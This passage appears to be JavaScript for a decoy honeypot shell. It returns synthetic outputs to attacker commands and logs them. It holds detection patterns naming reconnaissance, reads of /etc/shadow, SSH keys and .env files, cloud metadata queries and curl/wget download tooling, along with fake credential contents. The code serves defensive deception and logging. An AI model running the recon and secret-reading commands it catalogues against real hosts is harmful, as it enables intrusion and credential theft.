        if (/^(exit|logout|quit)$/.test(cmd)) return "__EXIT__";
        if (cmd === "id") return "uid=0(root) gid=0(root) groups=0(root)";
        if (cmd === "whoami") return "root";
        if (cmd.startsWith("uname")) return "Linux prod-server-01 5.15.0-1034-aws #38-Ubuntu SMP x86_64 GNU/Linux";
        if (cmd.startsWith("cat /etc/passwd")) { toFifo(`HARVESTED|${ip}|passwd`); return "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin"; }
        if (cmd.startsWith("cat /etc/shadow")) { toFifo(`HARVESTED|${ip}|shadow`); return "root:$6$xyz$fakehashfakehashfakehash:19000:0:99999:7:::"; }
        if (/curl|wget/.test(cmd)) { toFifo(`ATTACKER_REQUESTED_UPDATE|${ip}|${cmd}`); return "curl: (6) Could not resolve host: "; }
        if (/crontab/.test(cmd)) { toFifo(`HARVESTED|${ip}|crontab`); return "no crontab for root"; }
        if (/systemctl/.test(cmd)) return "Failed to connect to bus: No such file or directory";
        if (/ps /.test(cmd)) return "  PID TTY          TIME CMD\n    1 pts/0    00:00:00 bash\n    9 pts/0    00:00:00 ps";
        if (/history/.test(cmd)) return "    1  ls\n    2  id";
        if (/cat \/proc\/version/.test(cmd)) return "Linux version 5.15.0-1034-aws";
        if (/cat \/etc\/hosts/.test(cmd)) return "127.0.0.1 localhost\n127.0.1.1 prod-server-01";
        return `bash: ${cmd.split(" ")[0]}: command not found`;
    };
```


## Beryl.sh sandbox decoy profile before host-bridge update 2026-05-29T07:09:01Z

Reason archived: Replaced the prior decoy response profile with a host/container-aware attacker-facing profile. Owner-visible host bridge capability state remains transparent in `/run/purple/host_bridge_capabilities` and `/var/lib/.sophia/host_bridge_capabilities`; hostile sessions receive synthetic-only responses.

```text
    const fakeFiles = (p) => ({
        "/etc/passwd": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash\nsvc-app:x:998:998:Service Account:/srv/app:/usr/sbin/nologin",
        "/etc/shadow": "root:*:19443:0:99999:7:::ubuntu:!:19443:0:99999:7:::svc-app:!:19443:0:99999:7:::",
        "/etc/os-release": "PRETTY_NAME=\"Ubuntu 22.04.4 LTS\"\nNAME=\"Ubuntu\"\nVERSION_ID=\"22.04\"\nVERSION=\"22.04.4 LTS (Jammy Jellyfish)\"\nID=ubuntu",
        "/proc/version": "Linux version 5.15.0-1034-aws (buildd@lcy02-amd64-086) (gcc (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0) #38-Ubuntu SMP x86_64 GNU/Linux",
        "/etc/hosts": "127.0.0.1 localhost\n127.0.1.1 prod-api-01\n10.42.12.25 redis.internal\n10.42.12.31 db.internal",
        "/etc/resolv.conf": "nameserver 10.42.0.2\nsearch prod.internal",
        "/home/ubuntu/.ssh/authorized_keys": "# owner-managed decoy key registry\n",
        "/home/ubuntu/.env": "APP_ENV=production\nAPI_TOKEN=DECOY-CANARY-NOT-A-SECRET\nDB_HOST=db.internal\n",
        "/srv/app/config.yml": "environment: production\ndatabase: db.internal\ncredential_ref: owner-vault://decoy/app\n",
    })[p];

    const logRecon = (category, cmd) => {
        toFifo(`HOSTILE_RECON|${ip}|${category}|${cmd}`);
        toFifo(`DECOY_RESPONSE|${ip}|${category}`);
    };

    const classifyRecon = (cmd) => {
        const c = cmd.toLowerCase();
        if (/^(id|whoami|hostname|pwd|groups)\b/.test(c)) return "identity";
        if (/^(uname|lsb_release)\b|\/etc\/os-release|\/proc\/version/.test(c)) return "os";
        if (/\/etc\/(passwd|shadow|group)|\bsudo\s+-l\b|\blast\b|\bw\b|\bwho\b|\busers\b/.test(c)) return "users";
        if (/^(ip\s|ifconfig|route\b|ss\b|netstat\b|arp\b)|\/etc\/hosts|resolv\.conf/.test(c)) return "network";
        if (/^(ps\b|top\b|systemctl\b|service\b|journalctl\b)/.test(c)) return "process";
        if (/docker\s+ps|kubectl\b|aws\s+sts|gcloud\b|169\.254\.169\.254/.test(c)) return "cloud";
        if (/crontab|\/etc\/cron|\/etc\/systemd\/system/.test(c)) return "persistence";
        if (/^(ls\b|find\b|grep\b|cat\b)|\.ssh|authorized_keys|\.env|config|aws|kube|docker/.test(c)) return "files";
        if (/curl\b|wget\b|python\s+-c|bash\s+-c|chmod\s+\+x/.test(c)) return "tooling";
        return "command";
    };

    const profile = stableProfile(ip);
    const prompt = `${profile.user}@${profile.host}:~$ `;
    let buf = "";

    const answers = (cmd) => {
        cmd = cmd.trim();
        toFifo(`ATTACKER_CMD|${ip}|${cmd}`);
        if (/^(exit|logout|quit)$/.test(cmd)) return "__EXIT__";

        const category = classifyRecon(cmd);
        if (category !== "command") logRecon(category, cmd);

        if (cmd === "id") return "uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),27(sudo),998(svc-app)";
        if (cmd === "whoami") return profile.user;
        if (cmd === "hostname") return profile.host;
        if (cmd === "pwd") return profile.cwd;
        if (cmd === "groups") return "ubuntu adm sudo svc-app";
        if (cmd.startsWith("uname")) return `Linux ${profile.host} 5.15.0-1034-aws #38-Ubuntu SMP x86_64 GNU/Linux`;
        if (/^lsb_release\b/.test(cmd)) return "Distributor ID:\tUbuntu\nDescription:\tUbuntu 22.04.4 LTS\nRelease:\t22.04\nCodename:\tjammy";

        const catMatch = cmd.match(/^cat\s+([^\s;&|]+)$/);
        if (catMatch) {
            const wanted = catMatch[1].replace(/^~\//, "/home/ubuntu/");
            const contents = fakeFiles(wanted);
            if (contents !== undefined) {
                if (/passwd|shadow|authorized_keys|\.env|config/.test(wanted)) toFifo(`HARVESTED|${ip}|${wanted}`);
                return contents;
            }
            return `cat: ${catMatch[1]}: No such file or directory`;
        }

        if (/^sudo\s+-l\b/.test(cmd)) return "Matching Defaults entries for ubuntu on prod-api:\n    env_reset, mail_badpass\nUser ubuntu may run the following commands on prod-api:\n    (root) NOPASSWD: /usr/bin/systemctl status app.service";
        if (/^(last|who|w|users)\b/.test(cmd)) return "ubuntu   pts/0        10.42.12.18      Fri May 29 04:13   still logged in";
        if (/^(ip\s+a|ip\s+addr|ifconfig)\b/.test(cmd)) return `2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500\n    link/ether ${profile.mac} brd ff:ff:ff:ff:ff:ff\n    inet ${profile.privateIp}/24 brd 10.42.255.255 scope global eth0`;
        if (/^(ip\s+r|ip\s+route|route\s+-n)\b/.test(cmd)) return `default via ${profile.gateway} dev eth0 proto dhcp\n10.42.0.0/16 dev eth0 proto kernel scope link`;
        if (/^(ss\b|netstat\b)/.test(cmd)) return "tcp LISTEN 0 4096 0.0.0.0:22 0.0.0.0:* users:((\"sshd\",pid=711,fd=3))\ntcp ESTAB 0 0 10.42.12.25:443 10.42.12.31:54820";
        if (/^arp\b/.test(cmd)) return `? (${profile.gateway}) at 02:42:ac:2a:00:01 [ether] on eth0`;
        if (/^ps\b|^top\b/.test(cmd)) return "  PID TTY          TIME CMD\n    1 ?        00:00:02 systemd\n  711 ?        00:00:00 sshd\n 1028 pts/0    00:00:00 bash\n 1042 pts/0    00:00:00 ps";
        if (/^systemctl\b/.test(cmd)) return "  app.service loaded active running application service\n  ssh.service loaded active running OpenBSD Secure Shell server";
        if (/^service\b/.test(cmd)) return " [ + ]  app\n [ + ]  ssh\n [ - ]  unattended-upgrades";
        if (/^journalctl\b/.test(cmd)) return "-- Logs begin at Fri 2026-05-29 03:51:12 UTC --\nMay 29 prod-api systemd[1]: Started application service.";
        if (/^history\b/.test(cmd)) return "    1  ls -la\n    2  systemctl status app\n    3  cat /srv/app/config.yml";
        if (/^ls\b/.test(cmd)) return "app  backups  config.yml  logs  releases";
        if (/^find\b/.test(cmd)) return "/srv/app/config.yml\n/home/ubuntu/.env\n/home/ubuntu/.ssh/authorized_keys";
        if (/^grep\b/.test(cmd)) return "/srv/app/config.yml:credential_ref: owner-vault://decoy/app";
        if (/docker\s+ps/.test(cmd)) return "CONTAINER ID   IMAGE          COMMAND       STATUS        NAMES\n7d12f00dbeef   app:stable     ./server      Up 3 hours    app-web";
        if (/kubectl\b/.test(cmd)) return "The connection to the server localhost:8080 was refused";
        if (/aws\s+sts/.test(cmd)) return "An error occurred (InvalidClientTokenId) when calling the GetCallerIdentity operation: decoy credentials are not valid";
        if (/gcloud\b/.test(cmd)) return "ERROR: (gcloud.auth) No active account selected.";
        if (/169\.254\.169\.254/.test(cmd)) return "instance-id: i-0dec0y00000000000\nrole: app-server-decoy";
        if (/crontab|\/etc\/cron|\/etc\/systemd\/system/.test(cmd)) return "no crontab for ubuntu";
        if (/curl\b|wget\b/.test(cmd)) { toFifo(`ATTACKER_REQUESTED_UPDATE|${ip}|${cmd}`); return "Temporary failure resolving remote resource"; }
        if (/python\s+-c|bash\s+-c|chmod\s+\+x/.test(cmd)) return "permission denied in restricted owner decoy shell";
        return `bash: ${cmd.split(" ")[0]}: command not found`;
    };
```
